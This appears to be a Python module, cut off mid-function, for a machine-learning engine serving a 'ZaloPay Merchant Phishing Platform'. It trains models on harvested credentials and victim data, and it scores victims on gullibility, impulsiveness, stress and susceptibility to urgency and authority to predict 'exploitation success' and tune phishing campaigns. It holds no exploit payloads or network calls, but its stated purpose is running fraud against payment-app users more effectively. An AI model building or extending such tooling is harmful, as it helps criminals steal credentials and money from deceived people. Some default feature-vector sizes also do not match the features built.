"""
Machine Learning Pattern Analysis Engine
Behavior prediction and anomaly detection for the ZaloPay Merchant Phishing Platform
"""

import os
import json
import time
import uuid
import numpy as np
import pandas as pd
from datetime import datetime, timezone, timedelta
from typing import Dict, List, Any, Optional, Tuple, Union
import logging
from dataclasses import dataclass, asdict
from enum import Enum
import pickle
import joblib
from collections import defaultdict, deque
import warnings
warnings.filterwarnings('ignore')

# Machine Learning imports
from sklearn.ensemble import IsolationForest, RandomForestClassifier, GradientBoostingClassifier
from sklearn.cluster import DBSCAN, KMeans
from sklearn.preprocessing import StandardScaler, LabelEncoder, MinMaxScaler
from sklearn.model_selection import train_test_split, cross_val_score
from sklearn.metrics import classification_report, confusion_matrix, silhouette_score
from sklearn.neural_network import MLPClassifier
from sklearn.svm import OneClassSVM
from sklearn.linear_model import LogisticRegression
from sklearn.naive_bayes import GaussianNB
from sklearn.tree import DecisionTreeClassifier
from sklearn.metrics import accuracy_score, precision_score, recall_score, f1_score
import xgboost as xgb
from scipy import stats
from scipy.spatial.distance import pdist, squareform
import networkx as nx

# Configure logging
logging.basicConfig(level=logging.INFO)
logger = logging.getLogger(__name__)

class PatternType(Enum):
    """Pattern type enumeration"""
    VICTIM_BEHAVIOR = "victim_behavior"
    CAMPAIGN_PERFORMANCE = "campaign_performance"
    CREDENTIAL_PATTERNS = "credential_patterns"
    ACCESS_PATTERNS = "access_patterns"
    EXPLOITATION_SUCCESS = "exploitation_success"
    ANOMALY_DETECTION = "anomaly_detection"
    RISK_ASSESSMENT = "risk_assessment"

class AnomalyType(Enum):
    """Anomaly type enumeration"""
    STATISTICAL = "statistical"
    BEHAVIORAL = "behavioral"
    TEMPORAL = "temporal"
    NETWORK = "network"
    SECURITY = "security"

@dataclass
class MLModel:
    """Machine learning model structure"""
    model_id: str
    model_type: str
    pattern_type: PatternType
    version: str
    accuracy: float
    precision: float
    recall: float
    f1_score: float
    created_at: datetime
    last_trained: datetime
    features: List[str]
    hyperparameters: Dict[str, Any]
    model_data: bytes
    scaler_data: bytes
    label_encoder_data: bytes

@dataclass
class PredictionResult:
    """Prediction result structure"""
    prediction_id: str
    model_id: str
    input_data: Dict[str, Any]
    prediction: Any
    confidence: float
    probability: Dict[str, float]
    timestamp: datetime
    metadata: Dict[str, Any]

@dataclass
class AnomalyDetection:
    """Anomaly detection result"""
    anomaly_id: str
    anomaly_type: AnomalyType
    severity: str
    score: float
    description: str
    detected_at: datetime
    features: Dict[str, Any]
    recommendations: List[str]

class PatternAnalyzer:
    """Machine learning pattern analysis engine"""
    
    def __init__(self, mongodb_connection=None, redis_client=None):
        self.mongodb = mongodb_connection
        self.redis = redis_client
        self.models = {}
        self.scalers = {}
        self.label_encoders = {}
        self.feature_importance = {}
        
        # Initialize ML models
        self._initialize_models()
        
        # Feature engineering pipelines
        self.feature_pipelines = {
            PatternType.VICTIM_BEHAVIOR: self._create_victim_behavior_features,
            PatternType.CAMPAIGN_PERFORMANCE: self._create_campaign_performance_features,
            PatternType.CREDENTIAL_PATTERNS: self._create_credential_pattern_features,
            PatternType.ACCESS_PATTERNS: self._create_access_pattern_features,
            PatternType.EXPLOITATION_SUCCESS: self._create_exploitation_success_features,
            PatternType.ANOMALY_DETECTION: self._create_anomaly_detection_features,
            PatternType.RISK_ASSESSMENT: self._create_risk_assessment_features
        }
    
    def _initialize_models(self):
        """Initialize machine learning models"""
        try:
            # Victim behavior prediction models
            self.models[PatternType.VICTIM_BEHAVIOR] = {
                'classifier': GradientBoostingClassifier(n_estimators=100, random_state=42),
                'anomaly_detector': IsolationForest(contamination=0.1, random_state=42),
                'clustering': DBSCAN(eps=0.5, min_samples=5)
            }
            
            # Campaign performance models
            self.models[PatternType.CAMPAIGN_PERFORMANCE] = {
                'regressor': xgb.XGBRegressor(n_estimators=100, random_state=42),
                'classifier': RandomForestClassifier(n_estimators=100, random_state=42),
                'anomaly_detector': OneClassSVM(nu=0.1)
            }
            
            # Credential pattern models
            self.models[PatternType.CREDENTIAL_PATTERNS] = {
                'classifier': MLPClassifier(hidden_layer_sizes=(100, 50), random_state=42),
                'anomaly_detector': IsolationForest(contamination=0.05, random_state=42),
                'clustering': KMeans(n_clusters=5, random_state=42)
            }
            
            # Access pattern models
            self.models[PatternType.ACCESS_PATTERNS] = {
                'classifier': LogisticRegression(random_state=42),
                'anomaly_detector': OneClassSVM(nu=0.1),
                'clustering': DBSCAN(eps=0.3, min_samples=3)
            }
            
            # Exploitation success models
            self.models[PatternType.EXPLOITATION_SUCCESS] = {
                'classifier': xgb.XGBClassifier(n_estimators=100, random_state=42),
                'regressor': xgb.XGBRegressor(n_estimators=100, random_state=42),
                'anomaly_detector': IsolationForest(contamination=0.1, random_state=42)
            }
            
            # Anomaly detection models
            self.models[PatternType.ANOMALY_DETECTION] = {
                'isolation_forest': IsolationForest(contamination=0.1, random_state=42),
                'one_class_svm': OneClassSVM(nu=0.1),
                'dbscan': DBSCAN(eps=0.5, min_samples=5)
            }
            
            # Risk assessment models
            self.models[PatternType.RISK_ASSESSMENT] = {
                'classifier': RandomForestClassifier(n_estimators=100, random_state=42),
                'regressor': GradientBoostingClassifier(n_estimators=100, random_state=42),
                'anomaly_detector': IsolationForest(contamination=0.1, random_state=42)
            }
            
            # Initialize scalers and encoders
            for pattern_type in PatternType:
                self.scalers[pattern_type] = StandardScaler()
                self.label_encoders[pattern_type] = LabelEncoder()
            
            logger.info("Machine learning models initialized successfully")
            
        except Exception as e:
            logger.error(f"Error initializing ML models: {e}")
            raise
    
    def _create_victim_behavior_features(self, data: Dict[str, Any]) -> np.ndarray:
        """Create features for victim behavior analysis"""
        try:
            features = []
            
            # Basic victim information
            features.extend([
                data.get('age', 0),
                data.get('gender_encoded', 0),
                data.get('location_encoded', 0),
                data.get('device_type_encoded', 0),
                data.get('browser_encoded', 0),
                data.get('os_encoded', 0)
            ])
            
            # Behavioral patterns
            features.extend([
                data.get('login_frequency', 0),
                data.get('session_duration_avg', 0),
                data.get('page_views_avg', 0),
                data.get('click_rate', 0),
                data.get('form_completion_rate', 0),
                data.get('time_on_site_avg', 0)
            ])
            
            # Temporal patterns
            features.extend([
                data.get('hour_of_day', 0),
                data.get('day_of_week', 0),
                data.get('month', 0),
                data.get('is_weekend', 0),
                data.get('is_business_hours', 0)
            ])
            
            # Interaction patterns
            features.extend([
                data.get('oauth_provider_encoded', 0),
                data.get('campaign_id_encoded', 0),
                data.get('referrer_encoded', 0),
                data.get('utm_source_encoded', 0),
                data.get('utm_medium_encoded', 0),
                data.get('utm_campaign_encoded', 0)
            ])
            
            # Risk indicators
            features.extend([
                data.get('suspicious_activity_score', 0),
                data.get('risk_level_encoded', 0),
                data.get('threat_level_encoded', 0),
                data.get('vulnerability_score', 0)
            ])
            
            return np.array(features).reshape(1, -1)
            
        except Exception as e:
            logger.error(f"Error creating victim behavior features: {e}")
            return np.zeros((1, 25))  # Default feature vector
    
    def _create_campaign_performance_features(self, data: Dict[str, Any]) -> np.ndarray:
        """Create features for campaign performance analysis"""
        try:
            features = []
            
            # Campaign characteristics
            features.extend([
                data.get('campaign_type_encoded', 0),
                data.get('target_demographic_encoded', 0),
                data.get('geographic_scope_encoded', 0),
                data.get('budget', 0),
                data.get('duration_days', 0),
                data.get('target_count', 0)
            ])
            
            # Performance metrics
            features.extend([
                data.get('open_rate', 0),
                data.get('click_rate', 0),
                data.get('conversion_rate', 0),
                data.get('bounce_rate', 0),
                data.get('unsubscribe_rate', 0),
                data.get('engagement_rate', 0)
            ])
            
            # Temporal features
            features.extend([
                data.get('launch_hour', 0),
                data.get('launch_day_of_week', 0),
                data.get('launch_month', 0),
                data.get('is_holiday', 0),
                data.get('is_weekend', 0)
            ])
            
            # Content features
            features.extend([
                data.get('subject_line_length', 0),
                data.get('email_length', 0),
                data.get('has_images', 0),
                data.get('has_links', 0),
                data.get('has_attachments', 0),
                data.get('personalization_level', 0)
            ])
            
            # External factors
            features.extend([
                data.get('competitor_activity', 0),
                data.get('market_conditions', 0),
                data.get('seasonal_factor', 0),
                data.get('economic_indicator', 0)
            ])
            
            return np.array(features).reshape(1, -1)
            
        except Exception as e:
            logger.error(f"Error creating campaign performance features: {e}")
            return np.zeros((1, 20))  # Default feature vector
    
    def _create_credential_pattern_features(self, data: Dict[str, Any]) -> np.ndarray:
        """Create features for credential pattern analysis"""
        try:
            features = []
            
            # Password characteristics
            password = data.get('password', '')
            features.extend([
                len(password),
                sum(1 for c in password if c.isupper()),
                sum(1 for c in password if c.islower()),
                sum(1 for c in password if c.isdigit()),
                sum(1 for c in password if not c.isalnum()),
                password.count('123'),
                password.count('password'),
                password.count('admin'),
                password.count('qwerty')
            ])
            
            # Email characteristics
            email = data.get('email', '')
            features.extend([
                len(email),
                email.count('@'),
                email.count('.'),
                email.count('+'),
                email.count('-'),
                email.count('_'),
                len(email.split('@')[0]) if '@' in email else 0,
                len(email.split('@')[1]) if '@' in email else 0
            ])
            
            # Username characteristics
            username = data.get('username', '')
            features.extend([
                len(username),
                sum(1 for c in username if c.isdigit()),
                sum(1 for c in username if not c.isalnum()),
                username.count('.'),
                username.count('_'),
                username.count('-')
            ])
            
            # Domain analysis
            domain = email.split('@')[1] if '@' in email else ''
            features.extend([
                len(domain),
                domain.count('.'),
                domain.count('-'),
                domain.count('_'),
                sum(1 for c in domain if c.isdigit())
            ])
            
            # Behavioral patterns
            features.extend([
                data.get('login_attempts', 0),
                data.get('failed_attempts', 0),
                data.get('success_rate', 0),
                data.get('time_since_last_login', 0),
                data.get('password_age_days', 0)
            ])
            
            return np.array(features).reshape(1, -1)
            
        except Exception as e:
            logger.error(f"Error creating credential pattern features: {e}")
            return np.zeros((1, 25))  # Default feature vector
    
    def _create_access_pattern_features(self, data: Dict[str, Any]) -> np.ndarray:
        """Create features for access pattern analysis"""
        try:
            features = []
            
            # IP address features
            ip_address = data.get('ip_address', '')
            features.extend([
                data.get('ip_country_encoded', 0),
                data.get('ip_region_encoded', 0),
                data.get('ip_city_encoded', 0),
                data.get('is_vpn', 0),
                data.get('is_proxy', 0),
                data.get('is_tor', 0),
                data.get('ip_reputation_score', 0)
            ])
            
            # User agent features
            user_agent = data.get('user_agent', '')
            features.extend([
                len(user_agent),
                user_agent.count('Chrome'),
                user_agent.count('Firefox'),
                user_agent.count('Safari'),
                user_agent.count('Edge'),
                user_agent.count('Mobile'),
                user_agent.count('Android'),
                user_agent.count('iOS'),
                user_agent.count('Windows'),
                user_agent.count('Mac'),
                user_agent.count('Linux')
            ])
            
            # Session features
            features.extend([
                data.get('session_duration', 0),
                data.get('page_views', 0),
                data.get('unique_pages', 0),
                data.get('bounce_rate', 0),
                data.get('time_on_site', 0),
                data.get('exit_rate', 0)
            ])
            
            # Temporal features
            features.extend([
                data.get('hour_of_day', 0),
                data.get('day_of_week', 0),
                data.get('month', 0),
                data.get('is_weekend', 0),
                data.get('is_business_hours', 0),
                data.get('is_holiday', 0)
            ])
            
            # Geographic features
            features.extend([
                data.get('latitude', 0),
                data.get('longitude', 0),
                data.get('timezone_offset', 0),
                data.get('language_encoded', 0),
                data.get('currency_encoded', 0)
            ])
            
            return np.array(features).reshape(1, -1)
            
        except Exception as e:
            logger.error(f"Error creating access pattern features: {e}")
            return np.zeros((1, 30))  # Default feature vector
    
    def _create_exploitation_success_features(self, data: Dict[str, Any]) -> np.ndarray:
        """Create features for exploitation success prediction"""
        try:
            features = []
            
            # Victim characteristics
            features.extend([
                data.get('victim_age', 0),
                data.get('victim_gender_encoded', 0),
                data.get('victim_education_encoded', 0),
                data.get('victim_income_level', 0),
                data.get('victim_tech_savvy', 0),
                data.get('victim_risk_tolerance', 0)
            ])
            
            # Technical factors
            features.extend([
                data.get('browser_vulnerability_score', 0),
                data.get('os_vulnerability_score', 0),
                data.get('plugin_vulnerability_score', 0),
                data.get('network_security_score', 0),
                data.get('device_security_score', 0)
            ])
            
            # Behavioral factors
            features.extend([
                data.get('suspicion_level', 0),
                data.get('trust_level', 0),
                data.get('gullibility_score', 0),
                data.get('impulsiveness_score', 0),
                data.get('curiosity_score', 0)
            ])
            
            # Campaign factors
            features.extend([
                data.get('campaign_credibility', 0),
                data.get('message_personalization', 0),
                data.get('urgency_level', 0),
                data.get('social_proof_level', 0),
                data.get('authority_level', 0)
            ])
            
            # Environmental factors
            features.extend([
                data.get('time_pressure', 0),
                data.get('distraction_level', 0),
                data.get('stress_level', 0),
                data.get('fatigue_level', 0),
                data.get('cognitive_load', 0)
            ])
            
            return np.array(features).reshape(1, -1)
            
        except Exception as e:
            logger.error(f"Error creating exploitation success features: {e}")
            return np.zeros((1, 25))  # Default feature vector
    
    def _create_anomaly_detection_features(self, data: Dict[str, Any]) -> np.ndarray:
        """Create features for anomaly detection"""
        try:
            features = []
            
            # Statistical features
            features.extend([
                data.get('mean_value', 0),
                data.get('std_value', 0),
                data.get('min_value', 0),
                data.get('max_value', 0),
                data.get('median_value', 0),
                data.get('q1_value', 0),
                data.get('q3_value', 0),
                data.get('iqr_value', 0),
                data.get('skewness', 0),
                data.get('kurtosis', 0)
            ])
            
            # Temporal features
            features.extend([
                data.get('hour_of_day', 0),
                data.get('day_of_week', 0),
                data.get('month', 0),
                data.get('is_weekend', 0),
                data.get('is_holiday', 0),
                data.get('time_since_last_event', 0),
                data.get('event_frequency', 0)
            ])
            
            # Network features
            features.extend([
                data.get('unique_ips', 0),
                data.get('unique_users', 0),
                data.get('unique_sessions', 0),
                data.get('connection_count', 0),
                data.get('data_transfer', 0),
                data.get('packet_count', 0)
            ])
            
            # Behavioral features
            features.extend([
                data.get('action_count', 0),
                data.get('error_count', 0),
                data.get('success_rate', 0),
                data.get('response_time', 0),
                data.get('retry_count', 0),
                data.get('timeout_count', 0)
            ])
            
            return np.array(features).reshape(1, -1)
            
        except Exception as e:
            logger.error(f"Error creating anomaly detection features: {e}")
            return np.zeros((1, 25))  # Default feature vector
    
    def _create_risk_assessment_features(self, data: Dict[str, Any]) -> np.ndarray:
        """Create features for risk assessment"""
        try:
            features = []
            
            # Security indicators
            features.extend([
                data.get('vulnerability_count', 0),
                data.get('threat_level', 0),
                data.get('exposure_score', 0),
                data.get('attack_surface', 0),
                data.get('security_controls', 0),
                data.get('compliance_score', 0)
            ])
            
            # Business impact
            features.extend([
                data.get('data_value', 0),
                data.get('business_criticality', 0),
                data.get('financial_impact', 0),
                data.get('reputation_impact', 0),
                data.get('operational_impact', 0),
                data.get('regulatory_impact', 0)
            ])
            
            # Threat landscape
            features.extend([
                data.get('threat_intelligence_score', 0),
                data.get('attack_frequency', 0),
                data.get('attack_sophistication', 0),
                data.get('attacker_capability', 0),
                data.get('motivation_level', 0),
                data.get('opportunity_score', 0)
            ])
            
            # Environmental factors
            features.extend([
                data.get('industry_risk', 0),
                data.get('geographic_risk', 0),
                data.get('temporal_risk', 0),
                data.get('economic_risk', 0),
                data.get('political_risk', 0),
                data.get('technological_risk', 0)
            ])
            
            return np.array(features).reshape(1, -1)
            
        except Exception as e:
            logger.error(f"Error creating risk assessment features: {e}")
            return np.zeros((1, 20))  # Default feature vector
    
    def train_model(self, pattern_type: PatternType, training_data: List[Dict[str, Any]], 
                   target_column: str = None, model_type: str = 'classifier') -> MLModel:
        """Train a machine learning model"""
        try:
            # Prepare training data
            X = []
            y = []
            
            for data_point in training_data:
                features = self.feature_pipelines[pattern_type](data_point)
                X.append(features.flatten())
                
                if target_column and target_column in data_point:
                    y.append(data_point[target_column])
            
            X = np.array(X)
            
            if target_column and y:
                y = np.array(y)
                
                # Split data
                X_train, X_test, y_train, y_test = train_test_split(X, y, test_size=0.2, random_state=42)
                
                # Scale features
                X_train_scaled = self.scalers[pattern_type].fit_transform(X_train)
                X_test_scaled = self.scalers[pattern_type].transform(X_test)
                
                # Train model
                model = self.models[pattern_type][model_type]
                model.fit(X_train_scaled, y_train)
                
                # Evaluate model
                y_pred = model.predict(X_test_scaled)
                accuracy = accuracy_score(y_test, y_pred)
                precision = precision_score(y_test, y_pred, average='weighted', zero_division=0)
                recall = recall_score(y_test, y_pred, average='weighted', zero_division=0)
                f1 = f1_score(y_test, y_pred, average='weighted', zero_division=0)
                
            else:
                # Unsupervised learning
                X_scaled = self.scalers[pattern_type].fit_transform(X)
                model = self.models[pattern_type][model_type]
                model.fit(X_scaled)
                
                # Evaluate model (for clustering)
                if hasattr(model, 'labels_'):
                    labels = model.labels_
                    if len(set(labels)) > 1:
                        silhouette = silhouette_score(X_scaled, labels)
                    else:
                        silhouette = 0
                else:
                    silhouette = 0
                
                accuracy = silhouette
                precision = 0
                recall = 0
                f1 = 0
            
            # Create model object
            model_id = f"model_{pattern_type.value}_{int(time.time())}_{uuid.uuid4().hex[:8]}"
            
            # Serialize model and scaler
            model_data = pickle.dumps(model)
            scaler_data = pickle.dumps(self.scalers[pattern_type])
            label_encoder_data = pickle.dumps(self.label_encoders[pattern_type])
            
            ml_model = MLModel(
                model_id=model_id,
                model_type=model_type,
                pattern_type=pattern_type,
                version="1.0",
                accuracy=accuracy,
                precision=precision,
                recall=recall,
                f1_score=f1,
                created_at=datetime.now(timezone.utc),
                last_trained=datetime.now(timezone.utc),
                features=self._get_feature_names(pattern_type),
                hyperparameters=model.get_params() if hasattr(model, 'get_params') else {},
                model_data=model_data,
                scaler_data=scaler_data,
                label_encoder_data=label_encoder_data
            )
            
            # Store model
            self._store_model(ml_model)
            
            logger.info(f"Model trained successfully: {model_id}")
            return ml_model
            
        except Exception as e:
            logger.error(f"Error training model: {e}")
            raise
    
    def predict(self, pattern_type: PatternType, input_data: Dict[str, Any], 
               model_type: str = 'classifier') -> PredictionResult:
        """Make a prediction using trained model"""
        try:
            # Get model
            model = self._get_model(pattern_type, model_type)
            if not model:
                raise ValueError(f"No trained model found for {pattern_type.value}")
            
            # Prepare features
            features = self.feature_pipelines[pattern_type](input_data)
            features_scaled = self.scalers[pattern_type].transform(features)
            
            # Make prediction
            prediction = model.predict(features_scaled)[0]
            
            # Get prediction confidence
            if hasattr(model, 'predict_proba'):
                probabilities = model.predict_proba(features_scaled)[0]
                confidence = max(probabilities)
                probability_dict = {f"class_{i}": prob for i, prob in enumerate(probabilities)}
            else:
                confidence = 1.0
                probability_dict = {"prediction": float(prediction)}
            
            # Create prediction result
            prediction_id = f"pred_{int(time.time())}_{uuid.uuid4().hex[:8]}"
            
            result = PredictionResult(
                prediction_id=prediction_id,
                model_id=model.model_id,
                input_data=input_data,
                prediction=prediction,
                confidence=confidence,
                probability=probability_dict,
                timestamp=datetime.now(timezone.utc),
                metadata={"pattern_type": pattern_type.value, "model_type": model_type}
            )
            
            # Store prediction
            self._store_prediction(result)
            
            return result
            
        except Exception as e:
            logger.error(f"Error making prediction: {e}")
            raise
    
    def detect_anomalies(self, data: List[Dict[str, Any]], 
                        pattern_type: PatternType = PatternType.ANOMALY_DETECTION) -> List[AnomalyDetection]:
        """Detect anomalies in data"""
        try:
            anomalies = []
            
            # Prepare data
            X = []
            for data_point in data:
                features = self.feature_pipelines[pattern_type](data_point)
                X.append(features.flatten())
            
            X = np.array(X)
            X_scaled = self.scalers[pattern_type].fit_transform(X)
            
            # Detect anomalies using multiple methods
            anomaly_detectors = {
                'isolation_forest': self.models[pattern_type]['isolation_forest'],
                'one_class_svm': self.models[pattern_type]['one_class_svm'],
                'dbscan': self.models[pattern_type]['dbscan']
            }
            
            for detector_name, detector in anomaly_detectors.items():
                try:
                    if detector_name == 'dbscan':
                        labels = detector.fit_predict(X_scaled)
                        anomaly_indices = np.where(labels == -1)[0]
                    else:
                        anomaly_scores = detector.decision_function(X_scaled)
                        anomaly_indices = np.where(anomaly_scores < 0)[0]
                    
                    for idx in anomaly_indices:
                        anomaly_id = f"anomaly_{int(time.time())}_{uuid.uuid4().hex[:8]}"
                        
                        # Determine anomaly type and severity
                        anomaly_type = self._classify_anomaly_type(data[idx], detector_name)
                        severity = self._calculate_anomaly_severity(data[idx], anomaly_scores[idx] if 'anomaly_scores' in locals() else 0)
                        
                        anomaly = AnomalyDetection(
                            anomaly_id=anomaly_id,
                            anomaly_type=anomaly_type,
                            severity=severity,
                            score=float(anomaly_scores[idx]) if 'anomaly_scores' in locals() else 0.0,
                            description=self._generate_anomaly_description(data[idx], detector_name),
                            detected_at=datetime.now(timezone.utc),
                            features=data[idx],
                            recommendations=self._generate_anomaly_recommendations(data[idx], anomaly_type)
                        )
                        
                        anomalies.append(anomaly)
                        
                except Exception as e:
                    logger.error(f"Error with {detector_name}: {e}")
                    continue
            
            # Remove duplicates
            unique_anomalies = self._deduplicate_anomalies(anomalies)
            
            # Store anomalies
            for anomaly in unique_anomalies:
                self._store_anomaly(anomaly)
            
            logger.info(f"Detected {len(unique_anomalies)} anomalies")
            return unique_anomalies
            
        except Exception as e:
            logger.error(f"Error detecting anomalies: {e}")
            return []
    
    def analyze_patterns(self, data: List[Dict[str, Any]], 
                        pattern_type: PatternType) -> Dict[str, Any]:
        """Analyze patterns in data"""
        try:
            # Prepare data
            X = []
            for data_point in data:
                features = self.feature_pipelines[pattern_type](data_point)
                X.append(features.flatten())
            
            X = np.array(X)
            X_scaled = self.scalers[pattern_type].fit_transform(X)
            
            # Perform clustering analysis
            clustering_model = self.models[pattern_type]['clustering']
            cluster_labels = clustering_model.fit_predict(X_scaled)
            
            # Calculate cluster statistics
            unique_clusters = np.unique(cluster_labels)
            cluster_stats = {}
            
            for cluster_id in unique_clusters:
                if cluster_id == -1:  # Noise points
                    continue
                
                cluster_mask = cluster_labels == cluster_id
                cluster_data = X_scaled[cluster_mask]
                
                cluster_stats[f"cluster_{cluster_id}"] = {
                    "size": int(np.sum(cluster_mask)),
                    "percentage": float(np.sum(cluster_mask) / len(X_scaled) * 100),
                    "centroid": cluster_data.mean(axis=0).tolist(),
                    "std": cluster_data.std(axis=0).tolist()
                }
            
            # Calculate overall statistics
            analysis_results = {
                "total_samples": len(X_scaled),
                "num_clusters": len(unique_clusters) - (1 if -1 in unique_clusters else 0),
                "noise_points": int(np.sum(cluster_labels == -1)),
                "cluster_statistics": cluster_stats,
                "silhouette_score": silhouette_score(X_scaled, cluster_labels) if len(unique_clusters) > 1 else 0,
                "pattern_type": pattern_type.value,
                "analysis_timestamp": datetime.now(timezone.utc).isoformat()
            }
            
            # Store analysis results
            self._store_analysis_results(analysis_results)
            
            return analysis_results
            
        except Exception as e:
            logger.error(f"Error analyzing patterns: {e}")
            return {}
    
    def _get_feature_names(self, pattern_type: PatternType) -> List[str]:
        """Get feature names for pattern type"""
        feature_names = {
            PatternType.VICTIM_BEHAVIOR: [
                'age', 'gender', 'location', 'device_type', 'browser', 'os',
                'login_frequency', 'session_duration_avg', 'page_views_avg',
                'click_rate', 'form_completion_rate', 'time_on_site_avg',
                'hour_of_day', 'day_of_week', 'month', 'is_weekend', 'is_business_hours',
                'oauth_provider', 'campaign_id', 'referrer', 'utm_source', 'utm_medium', 'utm_campaign',
                'suspicious_activity_score', 'risk_level', 'threat_level', 'vulnerability_score'
            ],
            PatternType.CAMPAIGN_PERFORMANCE: [
                'campaign_type', 'target_demographic', 'geographic_scope', 'budget', 'duration_days', 'target_count',
                'open_rate', 'click_rate', 'conversion_rate', 'bounce_rate', 'unsubscribe_rate', 'engagement_rate',
                'launch_hour', 'launch_day_of_week', 'launch_month', 'is_holiday', 'is_weekend',
                'subject_line_length', 'email_length', 'has_images', 'has_links', 'has_attachments', 'personalization_level',
                'competitor_activity', 'market_conditions', 'seasonal_factor', 'economic_indicator'
            ],
            PatternType.CREDENTIAL_PATTERNS: [
                'password_length', 'password_uppercase', 'password_lowercase', 'password_digits', 'password_special',
                'password_123_count', 'password_password_count', 'password_admin_count', 'password_qwerty_count',
                'email_length', 'email_at_count', 'email_dot_count', 'email_plus_count', 'email_dash_count', 'email_underscore_count',
                'email_local_length', 'email_domain_length', 'username_length', 'username_digits', 'username_special',
                'username_dot_count', 'username_underscore_count', 'username_dash_count', 'domain_length', 'domain_dot_count',
                'domain_dash_count', 'domain_underscore_count', 'domain_digits', 'login_attempts', 'failed_attempts',
                'success_rate', 'time_since_last_login', 'password_age_days'
            ],
            PatternType.ACCESS_PATTERNS: [
                'ip_country', 'ip_region', 'ip_city', 'is_vpn', 'is_proxy', 'is_tor', 'ip_reputation_score',
                'user_agent_length', 'chrome_count', 'firefox_count', 'safari_count', 'edge_count', 'mobile_count',
                'android_count', 'ios_count', 'windows_count', 'mac_count', 'linux_count', 'session_duration',
                'page_views', 'unique_pages', 'bounce_rate', 'time_on_site', 'exit_rate', 'hour_of_day',
                'day_of_week', 'month', 'is_weekend', 'is_business_hours', 'is_holiday', 'latitude', 'longitude',
                'timezone_offset', 'language', 'currency'
            ],
            PatternType.EXPLOITATION_SUCCESS: [
                'victim_age', 'victim_gender', 'victim_education', 'victim_income_level', 'victim_tech_savvy', 'victim_risk_tolerance',
                'browser_vulnerability_score', 'os_vulnerability_score', 'plugin_vulnerability_score', 'network_security_score', 'device_security_score',
                'suspicion_level', 'trust_level', 'gullibility_score', 'impulsiveness_score', 'curiosity_score',
                'campaign_credibility', 'message_personalization', 'urgency_level', 'social_proof_level', 'authority_level',
                'time_pressure', 'distraction_level', 'stress_level', 'fatigue_level', 'cognitive_load'
            ],
            PatternType.ANOMALY_DETECTION: [
                'mean_value', 'std_value', 'min_value', 'max_value', 'median_value', 'q1_value', 'q3_value', 'iqr_value', 'skewness', 'kurtosis',
                'hour_of_day', 'day_of_week', 'month', 'is_weekend', 'is_holiday', 'time_since_last_event', 'event_frequency',
                'unique_ips', 'unique_users', 'unique_sessions', 'connection_count', 'data_transfer', 'packet_count',
                'action_count', 'error_count', 'success_rate', 'response_time', 'retry_count', 'timeout_count'
            ],
            PatternType.RISK_ASSESSMENT: [
                'vulnerability_count', 'threat_level', 'exposure_score', 'attack_surface', 'security_controls', 'compliance_score',
                'data_value', 'business_criticality', 'financial_impact', 'reputation_impact', 'operational_impact', 'regulatory_impact',
                'threat_intelligence_score', 'attack_frequency', 'attack_sophistication', 'attacker_capability', 'motivation_level', 'opportunity_score',
                'industry_risk', 'geographic_risk', 'temporal_risk', 'economic_risk', 'political_risk', 'technological_risk'
            ]
        }
        
        return feature_names.get(pattern_type, [])
    
    def _classify_anomaly_type(self, data: Dict[str, Any], detector_name: str) -> AnomalyType:
        """Classify anomaly type based on data characteristics"""
        try:
            # Statistical anomalies
            if detector_name == 'isolation_forest':
                return AnomalyType.STATISTICAL
            
            # Behavioral anomalies
            elif detector_name == 'one_class_svm':
                return AnomalyType.BEHAVIORAL
            
            # Network anomalies
            elif detector_name == 'dbscan':
                if 'ip_address' in data or 'network' in str(data).lower():
                    return AnomalyType.NETWORK
                else:
                    return AnomalyType.TEMPORAL
            
            # Security anomalies
            if any(key in data for key in ['security', 'threat', 'attack', 'vulnerability']):
                return AnomalyType.SECURITY
            
            return AnomalyType.BEHAVIORAL
            
        except Exception as e:
            logger.error(f"Error classifying anomaly type: {e}")
            return AnomalyType.BEHAVIORAL
    
    def _calculate_anomaly_severity(self, data: Dict[str, Any], score: float) -> str:
        """Calculate anomaly severity based on score and data"""
        try:
            # Normalize score to 0-1 range
            normalized_score = abs(score)
            
            if normalized_score > 0.8:
                return "critical"
            elif normalized_score > 0.6:
                return "high"
            elif normalized_score > 0.4:
                return "medium"
            elif normalized_score > 0.2:
                return "low"
            else:
                return "info"
                
        except Exception as e:
            logger.error(f"Error calculating anomaly severity: {e}")
            return "medium"
    
    def _generate_anomaly_description(self, data: Dict[str, Any], detector_name: str) -> str:
        """Generate human-readable anomaly description"""
        try:
            descriptions = {
                'isolation_forest': f"Statistical anomaly detected in data pattern",
                'one_class_svm': f"Behavioral anomaly detected in user activity",
                'dbscan': f"Clustering anomaly detected in data distribution"
            }
            
            base_description = descriptions.get(detector_name, "Anomaly detected in data pattern")
            
            # Add specific details based on data
            if 'ip_address' in data:
                base_description += f" (IP: {data['ip_address']})"
            if 'user_id' in data:
                base_description += f" (User: {data['user_id']})"
            if 'timestamp' in data:
                base_description += f" (Time: {data['timestamp']})"
            
            return base_description
            
        except Exception as e:
            logger.error(f"Error generating anomaly description: {e}")
            return "Anomaly detected in data pattern"
    
    def _generate_anomaly_recommendations(self, data: Dict[str, Any], anomaly_type: AnomalyType) -> List[str]:
        """Generate recommendations for anomaly handling"""
        try:
            recommendations = []
            
            if anomaly_type == AnomalyType.SECURITY:
                recommendations.extend([
                    "Investigate potential security threat",
                    "Review access logs for suspicious activity",
                    "Consider implementing additional security controls",
                    "Notify security team for further analysis"
                ])
            elif anomaly_type == AnomalyType.BEHAVIORAL:
                recommendations.extend([
                    "Monitor user behavior patterns",
                    "Check for account compromise indicators",
                    "Review recent activity for unusual patterns",
                    "Consider additional authentication requirements"
                ])
            elif anomaly_type == AnomalyType.NETWORK:
                recommendations.extend([
                    "Check network connectivity and performance",
                    "Review firewall and security rules",
                    "Monitor for DDoS or other network attacks",
                    "Verify network configuration changes"
                ])
            elif anomaly_type == AnomalyType.TEMPORAL:
                recommendations.extend([
                    "Review system logs for time-based patterns",
                    "Check for scheduled maintenance or updates",
                    "Monitor for time-based attacks or exploits",
                    "Verify system clock synchronization"
                ])
            else:
                recommendations.extend([
                    "Investigate data patterns and trends",
                    "Review system performance metrics",
                    "Check for configuration changes",
                    "Monitor for recurring anomalies"
                ])
            
            return recommendations
            
        except Exception as e:
            logger.error(f"Error generating anomaly recommendations: {e}")
            return ["Investigate anomaly for further analysis"]
    
    def _deduplicate_anomalies(self, anomalies: List[AnomalyDetection]) -> List[AnomalyDetection]:
        """Remove duplicate anomalies"""
        try:
            unique_anomalies = []
            seen_features = set()
            
            for anomaly in anomalies:
                # Create a feature signature for deduplication
                feature_signature = tuple(sorted(anomaly.features.items()))
                
                if feature_signature not in seen_features:
